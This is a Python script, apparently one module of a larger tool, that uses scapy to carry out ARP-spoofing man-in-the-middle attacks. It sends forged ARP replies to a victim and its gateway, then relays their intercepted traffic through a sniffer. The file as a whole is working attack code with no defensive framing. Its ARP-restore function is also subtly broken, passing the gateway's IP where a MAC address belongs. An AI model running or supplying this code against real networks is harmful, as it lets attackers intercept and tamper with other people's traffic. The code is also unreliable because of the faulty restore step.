from scapy.all import *
import threading
from scapy.layers.l2 import *
import config
from config import *

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=3, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, gateway_ip, target_mac, gateway_mac, my_mac):
    packet_to_victim = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=my_mac)
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=my_mac)
    sendp(packet_to_victim, verbose=False)
    sendp(packet_to_gateway, verbose=False)

def forward_packet(packet, gateway_mac, my_mac):
    if not packet.haslayer(Ether):
        return

    for target in targets:
        if packet[Ether].src == target["mac"]:
            packet[Ether].src = my_mac
            packet[Ether].dst = gateway_mac
            sendp(packet, verbose=False)
        elif packet[Ether].src == gateway_mac and packet.haslayer(IP) and packet[IP].dst == target["ip"]:
            packet[Ether].src = my_mac
            packet[Ether].dst = target["mac"]
            sendp(packet, verbose=False)


def enable_forwarding(gateway_mac, my_mac):
    print("Enabling packet forwarding.....")
    config.sniffer = AsyncSniffer(
        filter="not arp",
        prn=lambda pkt: forward_packet(pkt, gateway_mac, my_mac),
        store=0)
    config.sniffer.start()

def restore_arp(target_mac, gateway_mac, target_ip, gateway_ip):
    print("Restoring arp.....")
    packet_to_victim = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_ip)
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    sendp(packet_to_victim, verbose=False)
    sendp(packet_to_gateway, verbose=False)